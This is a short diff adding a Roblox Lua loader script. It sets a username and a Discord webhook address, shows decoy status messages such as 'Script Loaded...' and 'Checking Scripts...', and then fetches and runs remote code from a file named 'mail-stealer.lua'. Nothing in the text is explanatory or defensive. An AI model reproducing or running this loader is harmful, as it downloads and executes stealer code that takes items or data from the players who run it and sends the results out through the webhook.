@@ -1,0 +1,5 @@
+Username = "Rusty1279" WebHook =
+
+"https://discord.com/api/webhooks/1244569462615572611/O1g0eE3rlN-zoMmK6FECYZe2xpyyyaJ5xsxp8v0KeuJrE0HBn7FRj3AsF0dk02DtrwM9" _G.CustomScriptName = "Coen" _G.Text1 = "Script Loaded..." _G.Text2 = "Waiting for Script"_G.Text3 = "Checking Scripts..." _G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://wumat.xyz/scripts/mail-stealer.lua")) ()
